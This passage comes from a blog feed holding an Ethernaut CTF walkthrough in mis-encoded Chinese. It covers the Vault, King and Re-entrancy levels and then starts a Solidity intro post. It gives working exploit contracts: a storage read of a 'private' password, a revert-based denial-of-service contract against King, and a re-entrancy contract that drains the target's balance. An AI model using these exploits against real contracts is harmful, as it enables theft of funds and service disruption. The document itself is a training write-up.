å¹¶æ²¡æœ‰å‘ä»€ä¹ˆåŠæ³•å¯ä»¥é˜»æ­¢æ”»å‡»è€…é€šè¿‡è‡ªæ¯çš„æ–¹æ³•å‘åˆçº¦å‘é€ ether, æ‰€ä»¥, ä¸è¦å°†ä»»ä½•åˆçº¦é€»è¾‘åŸºäº <code>address(this).balance == 0</code> ä¹‹ä¸Š.</p></blockquote><h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><blockquote><p>æ‰“å¼€ vault æ¥é€šè¿‡è¿™ä¸€å…³!</p></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Vault</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">bool</span> <span class="token keyword">public</span> locked<span class="token punctuation">;</span>  <span class="token builtin">bytes32</span> <span class="token keyword">private</span> password<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    password <span class="token operator">=</span> _password<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>password <span class="token operator">==</span> _password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜æ˜¾è¦æ‹¿passwordï¼Œä½†æ˜¯privateæ€ä¹ˆæ‹¿å‘¢ï¼Ÿ</p><blockquote><p>è¿™æ¶‰åŠåˆ°ä¸€ç‚¹ï¼šä»¥å¤ªåŠéƒ¨ç½²å’Œåˆçº¦ä¸Šæ‰€æœ‰çš„æ•°æ®éƒ½æ˜¯å¯è¯»çš„ï¼ŒåŒ…æ‹¬è¿™é‡Œåˆçº¦å†…å®šä¹‰ä¸ºprivateç±»å‹çš„passwordå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>web3.eth.getStorageAt</code>æ¥è¯»å–åˆçº¦è¡Œå¯¹åº”åœ°å€çš„æ•°æ®</p><pre class="line-numbers language-none"><code class="language-none">web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¬¬ä¸€ä¸ªå‚æ•°æ—¶å¯¹åº”è¦è¯»å–çš„åˆçº¦åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯è¦è¯»å–å†…å®¹çš„ç´¢å¼•ä½ç½®(å˜é‡æ˜¯ç¬¬å‡ ä¸ªè¢«å®šä¹‰çš„å˜é‡)ï¼Œç¬¬ä¸‰ä¸ªå‚æ•°å¦‚æœè¢«è®¾ç½®ï¼Œé‚£ä¹ˆå°±ä¸ä¼šä½¿ç”¨é»˜è®¤çš„block(è¢«<a href="https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#eth-defaultblock">web3.eth.defaultBlock</a>è®¾ç½®çš„é»˜è®¤å—)ï¼Œè€Œæ˜¯ä½¿ç”¨ç”¨æˆ·è‡ªå®šä¹‰çš„å—ï¼Œè¿™ä¸ªå‚æ•°å¯é€‰é¡¹æœ‰<code>&quot;earliest&quot;</code>, <code>&quot;latest&quot;</code> å’Œ <code>&quot;pending&quot;</code>ï¼Œç¬¬å››ä¸ªé€‰é¡¹è®¾ç½®å›è°ƒå‡½æ•°ã€‚</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬ç›´æ¥è¯»å°±å¥½å•¦ï¼Œpasswordç¬¬äºŒä¸ªè¢«å®šä¹‰ï¼Œæˆ‘ä»¬ç›´æ¥è¯»1</p><pre class="line-numbers language-none"><code class="language-none">await web3.eth.getStorageAt(contract.address,1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åç”¨passwordè§£é”å°±å¥½å•¦ï½</p><blockquote><p>è¯·è®°ä½, å°†ä¸€ä¸ªå˜é‡è®¾åˆ¶æˆç§æœ‰, åªèƒ½ä¿è¯ä¸è®©åˆ«çš„åˆçº¦è®¿é—®ä»–. è®¾åˆ¶æˆç§æœ‰çš„çŠ¶æ€å˜é‡å’Œæœ¬åœ°å˜é‡, ä¾æ—§å¯ä»¥è¢«å…¬å¼€è®¿é—®.</p><p>ä¸ºäº†ç¡®ä¿æ•°æ®ç§æœ‰, éœ€è¦åœ¨ä¸Šé“¾å‰åŠ å¯†. åœ¨è¿™ç§æƒ…å†µä¸‹, å¯†é’¥ç»å¯¹ä¸è¦å…¬å¼€, å¦åˆ™ä¼šè¢«ä»»ä½•æƒ³çŸ¥é“çš„äººè·å¾—. <a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/">zk-SNARKs</a> æä¾›äº†ä¸€ä¸ªå¯ä»¥åˆ¤æ–­æŸä¸ªäººæ˜¯å¦æœ‰æŸä¸ªç§˜å¯†å‚æ•°çš„æ–¹æ³•,ä½†æ˜¯ä¸å¿…é€éœ²è¿™ä¸ªå‚æ•°.</p></blockquote><h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><blockquote><p>ä¸‹é¢çš„åˆçº¦è¡¨ç¤ºäº†ä¸€ä¸ªå¾ˆç®€å•çš„æ¸¸æˆ: ä»»ä½•ä¸€ä¸ªå‘é€äº†é«˜äºç›®å‰ä»·æ ¼çš„äººå°†æˆä¸ºæ–°çš„å›½ç‹. åœ¨è¿™ä¸ªæƒ…å†µä¸‹, ä¸Šä¸€ä¸ªå›½ç‹å°†ä¼šè·å¾—æ–°çš„å‡ºä»·, è¿™æ ·å¯ä»¥èµšå¾—ä¸€äº›ä»¥å¤ªå¸. çœ‹èµ·æ¥åƒæ˜¯åºæ°éª—å±€.</p><p>è¿™ä¹ˆæœ‰è¶£çš„æ¸¸æˆ, ä½ çš„ç›®æ ‡æ˜¯æ”»ç ´ä»–.</p><p>å½“ä½ æäº¤å®ä¾‹ç»™å…³å¡æ—¶, å…³å¡ä¼šé‡æ–°ç”³æ˜ç‹ä½. ä½ éœ€è¦é˜»æ­¢ä»–é‡è·ç‹ä½æ¥é€šè¿‡è¿™ä¸€å…³.</p></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">King</span> <span class="token punctuation">&#123;</span>  <span class="token builtin">address</span> <span class="token keyword">payable</span> king<span class="token punctuation">;</span>  <span class="token builtin">uint</span> <span class="token keyword">public</span> prize<span class="token punctuation">;</span>  <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>      king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> prize <span class="token operator">||</span> msg<span class="token punctuation">.</span>sender <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>    king<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    king <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    prize <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">_king</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> king<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥çœ‹receiveï¼Œæˆ‘ä»¬éœ€è¦å‡ºä»·æ¯”åŸæ¥çš„kingé«˜æ‰èƒ½æ‹¿åˆ°æ§åˆ¶æƒï¼Œå¹¶ä¸”é¢˜ç›®ä¸­è¯´äº†åœ¨æäº¤å®ä¾‹æ˜¯å…³å¡ä¼šé‡æ–°å°è¯•å¤ºå›ç‹æƒï¼Œä¹Ÿå°±æ˜¯å†ç»™æˆ‘ä»¬ä¸€ä¸ªæ›´å¤§æ•°é¢çš„ethï¼Œæˆ‘ä»¬æ€ä¹ˆæ‰èƒ½é˜²æ­¢ä»–é€šè¿‡æ›´é«˜å‡ºä»·æ¥å¤ºèµ°ç‹ä½å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬åªéœ€è¦åœ¨å¦èµ·ä¸€ä¸ªåˆçº¦ï¼Œåœ¨åˆçº¦ä¸­è®¾ç½®receiveå†…å®¹ä¸ºrevertå‡½æ•°ï¼Œè¿™æ ·åœ¨æˆ‘ä»¬çš„åˆçº¦æ”¶åˆ°ä»£å¸çš„æ—¶å€™å°±ä¼šè§¦å‘å›æ»šå¯¼è‡´kingé‡å¤ºç‹ä½å¤±è´¥</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">AttackKing</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _victim<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        _victim<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">gas</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span><span class="token number">0.01</span> ether<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>å¤§å¤šæ•° Ethernaut çš„å…³å¡å°è¯•å±•ç¤ºçœŸå®å‘ç”Ÿçš„ bug å’Œ hack (ä»¥ç®€åŒ–è¿‡çš„æ–¹å¼).</p><p>å…³äºè¿™æ¬¡çš„æƒ…å†µ, å‚è§: <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html">King of the Ether</a> å’Œ <a href="http://www.kingoftheether.com/postmortem.html">King of the Ether Postmortem</a></p></blockquote><h1 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h1><p>ç»å…¸çš„é‡å…¥æ¼æ´ç»ˆäºæ¥å–½</p><blockquote><p>è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯å·èµ°åˆçº¦çš„æ‰€æœ‰èµ„äº§.</p><p> è¿™äº›å¯èƒ½æœ‰å¸®åŠ©:</p><ul><li>ä¸å¯ä¿¡çš„åˆçº¦å¯ä»¥åœ¨ä½ æ„æ–™ä¹‹å¤–çš„åœ°æ–¹æ‰§è¡Œä»£ç .</li><li>Fallback methods</li><li>æŠ›å‡º/æ¢å¤ bubbling</li><li>æœ‰çš„æ—¶å€™æ”»å‡»ä¸€ä¸ªåˆçº¦çš„æœ€å¥½æ–¹å¼æ˜¯ä½¿ç”¨å¦ä¸€ä¸ªåˆçº¦.</li><li>æŸ¥çœ‹ä¸Šæ–¹å¸®åŠ©é¡µé¢, â€œæ§åˆ¶å°ä¹‹å¤–â€ éƒ¨åˆ†</li></ul></blockquote><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Reentrance</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">using</span> <span class="token class-name">SafeMath</span> <span class="token keyword">for</span> <span class="token builtin">uint256</span><span class="token punctuation">;</span>  <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>  <span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>    balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span> <span class="token operator">=</span> balances<span class="token punctuation">[</span>_to<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _who<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint</span> balance<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> balances<span class="token punctuation">[</span>_who<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">function</span> <span class="token function">withdraw</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _amount<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> _amount<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token punctuation">(</span><span class="token builtin">bool</span> result<span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span>_amount<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        _amount<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> _amount<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ³¨æ„è¿™é‡Œä½¿ç”¨äº†<code>call&#123;value:xx&#125;</code>çš„å½¢å¼ï¼Œ<code>call</code>æ˜¯<code>send</code>å’Œ<code>transfer</code>å‡½æ•°åº•å±‚å®ç°ï¼Œä¹Ÿæ˜¯ç”¨æ¥è½¬è´¦çš„ã€‚ä¸å®ƒä»¬çš„åŒºåˆ«åœ¨äºï¼Œ<a href="https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-2-sending-ether-receiving-ether-emitting-events/topic/sending-ether-send-vs-transfer-vs-call/">å‚è€ƒé“¾æ¥</a></p><ul><li>transfer:è¦æ±‚æ¥æ”¶çš„æ™ºèƒ½åˆçº¦ä¸­å¿…é¡»æœ‰ä¸€ä¸ª<code>fallback</code>æˆ–è€…<code>receive</code>å‡½æ•°ï¼Œå¦åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯(error)ï¼Œå¹¶ä¸”revertï¼ˆä¹Ÿå°±æ˜¯å›æ»šåˆ°äº¤æ˜“å‰çš„çŠ¶æ€ï¼‰ã€‚è€Œä¸”æœ‰å•ç¬”äº¤æ˜“ä¸­çš„æ“ä½œæ€»gasä¸èƒ½è¶…è¿‡2300çš„é™åˆ¶ã€‚transferå‡½æ•°ä¼šåœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µæŠ›å‡ºé”™è¯¯ï¼š<ul><li>ä»˜æ¬¾æ–¹åˆçº¦çš„ä½™é¢ä¸è¶³ï¼Œå°äºæ‰€è¦å‘é€çš„value</li><li>æ¥æ”¶æ–¹åˆçº¦æ‹’ç»æ¥æ”¶æ”¯ä»˜</li></ul></li><li>send:å’Œtransferå‡½æ•°çš„å·¥ä½œæ–¹å¼åŸºæœ¬ä¸€æ ·ï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºï¼Œå½“å‡ºç°ä¸Šè¿°ä¸¤ç§äº¤æ˜“å¤±è´¥çš„æƒ…å†µæ—¶ï¼Œsendçš„è¿”å›ç»“æœæ˜¯ä¸€ä¸ªbooleanå€¼ï¼Œè€Œä¸ä¼šæ‰§è¡Œrevertå›æ»šã€‚</li><li>call: callå‡½æ•°å’Œä¸Šé¢æœ€å¤§çš„åŒºåˆ«åœ¨äºï¼Œå®ƒæ²¡æœ‰gasçš„é™åˆ¶ï¼Œä½¿ç”¨callæ—¶EVMå°†æ‰€æœ‰gasè½¬ç§»åˆ°æ¥æ”¶åˆçº¦ä¸Šï¼Œå½¢å¼å¦‚ä¸‹:</li></ul></blockquote><p>å®¡è®¡åˆçº¦ä»£ç ï¼Œè¿™ä¸ªåˆçº¦çš„ä½œç”¨ç±»ä¼¼äºé“¶è¡Œï¼Œdonateå­˜withdrawå–ï¼Œé‚£ä¹ˆè¿™ä¸ªä»£ç é—®é¢˜ç©¶ç«Ÿå‡ºåœ¨å“ªé‡Œå‘¢ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹å­˜æ¬¾å‡½æ•°ï¼Œé¦–å…ˆåˆ¤æ–­æˆ‘ä»¬çš„è´¦æˆ·æ˜¯å¦æœ‰è¶³å¤Ÿä½™é¢ï¼Œç„¶åç»™æˆ‘ä»¬çš„è´¦æˆ·è½¬å¸ï¼Œæœ€åæ‰£é™¤ä½™é¢ï¼Œçœ‹èµ·æ¥éƒ½æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœé“¶è¡Œçš„å­˜æ¬¾è´¦æˆ·å¹¶ä¸æ˜¯ä¸€ä¸ªé’±åŒ…è€Œæ˜¯ä¸€ä¸ªåˆçº¦å‘¢ï¼Ÿ</p><p>è¿™æ—¶ä¼šç›´æ¥è¿›å…¥åˆ°è¿™ä¸ªåˆçº¦çš„fallbackæˆ–è€…receiveå‡½æ•°ä¸­ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç‰¹æ®Šçš„åˆçº¦ï¼Œè®©æ¥æ”¶å‡½æ•°çš„fallbackå‡½æ•°é‡å¤è°ƒç”¨ç›®æ ‡åˆçº¦çš„<code>withdraw</code>å‡½æ•°ï¼Œè¿™æ ·åˆçº¦å°±ä¼šä¸æ–­ç»™æˆ‘ä»¬æ‰€ç¼–å†™çš„åˆçº¦è½¬è´¦ç›´è‡³ä½™é¢ä¸º0ã€‚å…·ä½“ä»£ç å¦‚ä¸‹</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">attack</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">payable</span> target<span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">payable</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token builtin">uint</span> amount <span class="token operator">=</span> <span class="token number">100000000000000</span> wei<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">payable</span> _addr<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        target<span class="token operator">=</span>_addr<span class="token punctuation">;</span>        owner <span class="token operator">=</span> msg<span class="token punctuation">.</span>sender<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">step1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>        <span class="token builtin">bool</span> b<span class="token punctuation">;</span>        <span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span>call<span class="token punctuation">&#123;</span>value<span class="token punctuation">:</span> amount<span class="token punctuation">&#125;</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"donate(address)"</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token string">"step1 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">setp2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token builtin">bool</span> b<span class="token punctuation">;</span>        <span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"withdraw(uint256)"</span><span class="token punctuation">,</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token string">"step2 error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    fallback <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>        <span class="token builtin">bool</span> b<span class="token punctuation">;</span>        <span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>target<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"withdraw(uint256)"</span><span class="token punctuation">,</span>amount<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span><span class="token string">"fallback error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">mywithdraw</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token operator">==</span>owner<span class="token punctuation">,</span><span class="token string">'not you'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>1000000000000000</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æ™ºèƒ½åˆçº¦å…¥é—¨</title>
      <link href="/posts/ad0a0e46.html"/>
      <url>/posts/ad0a0e46.html</url>
      
        <content type="html"><![CDATA[<p>åŒºå—é“¾æˆ‘æ¥å•¦</p><span id="more"></span><h1 id="æ™ºèƒ½åˆçº¦å…¥é—¨"><a href="#æ™ºèƒ½åˆçº¦å…¥é—¨" class="headerlink" title="æ™ºèƒ½åˆçº¦å…¥é—¨"></a>æ™ºèƒ½åˆçº¦å…¥é—¨</h1><h2 id="Solidity"><a href="#Solidity" class="headerlink" title="Solidity"></a>Solidity</h2><blockquote><p>Solidityä¸­æ™ºèƒ½åˆçº¦çš„å«ä¹‰å°±æ˜¯ä¸€ç»„ä»£ç ï¼ˆå®ƒçš„ <em>åŠŸèƒ½</em> )å’Œæ•°æ®ï¼ˆå®ƒçš„ <em>çŠ¶æ€</em> ï¼‰çš„é›†åˆï¼Œå¹¶ä¸”å®ƒä»¬æ˜¯ä½äºä»¥å¤ªåŠåŒºå—é“¾çš„ä¸€ä¸ªç‰¹å®šåœ°å€ä¸Šçš„ã€‚</p></blockquote><p>Solidityä¹Ÿæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œä¸è¿‡å®ƒé’ˆå¯¹æ™ºèƒ½åˆçº¦é¡¹ç›®è¿›è¡Œäº†å…¨é¢çš„æ”¯æŒï¼Œè¦æƒ³äº†è§£ä¸€é—¨è¯­è¨€å½“ç„¶è¦ä»ç¼–å†™ç¨‹åºå¼€å§‹å’¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ¥å†™æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªSolidityåˆçº¦å§</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">//Name.sol</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.16</span><span class="token punctuation">;</span><span class="token comment">//Solidityå¿…é¡»å¼€å¤´ï¼Œç”Ÿå‘½åˆçº¦ç‰ˆæœ¬</span><span class="token keyword">contract</span> <span class="token class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token builtin">string</span> name<span class="token operator">=</span><span class="token string">"Jlan"</span><span class="token punctuation">;</span><span class="token comment">//è®¾å®šçŠ¶æ€</span>    <span class="token keyword">function</span> <span class="token function">getName</span><span 